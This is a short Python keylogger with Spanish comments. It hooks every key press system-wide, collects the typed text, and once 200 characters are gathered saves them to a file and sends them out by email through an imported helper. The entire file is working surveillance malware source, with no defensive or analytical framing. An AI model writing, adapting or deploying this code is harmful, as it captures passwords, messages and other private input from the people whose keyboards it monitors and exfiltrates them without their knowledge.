import keyboard
import time
from EmailSender import send_email
from FileSaver import save_content_to_file  

# Obtener fecha y hora actual
tiempo_local = time.localtime()
fecha_hora_actual = time.strftime("%Y-%m-%d %H:%M:%S", tiempo_local)

# Variable para almacenar el texto registrado
text = f"Recorded content from keylogger\nAt {fecha_hora_actual}\n"
text += "----------------------------\n\n"

def process_key_event(event):
    """
    Procesa el evento de teclado para capturar la tecla presionada y agregarla al texto.
    """
    global text  # Usamos global para modificar la variable fuera del ámbito local
    key = event.name  # Obtener el nombre de la tecla presionada

    if event.event_type == 'down':  # Filtrar solo eventos 'down'
        if key == 'enter':
            text += "\n"  # Salto de línea
        elif key == 'space':
            text += " "  # Espacio
        elif key == 'backspace':
            text = text[:-1]  # Eliminar último carácter
        else:
            text += key  # Agregar tecla al texto registrado

# Registrar los eventos de teclado
keyboard.on_press(process_key_event)

try:
    print("Keylogger iniciado. Presiona Ctrl+C para detener.")
    while True:
        if len(text) >= 200:  # Límite de caracteres
            save_content_to_file(text)  # Guardar en archivo
            send_email(text)  # Enviar por correo
            text = ""  # Reiniciar la variable de texto
except KeyboardInterrupt:
        print("Keylogger detenido.")

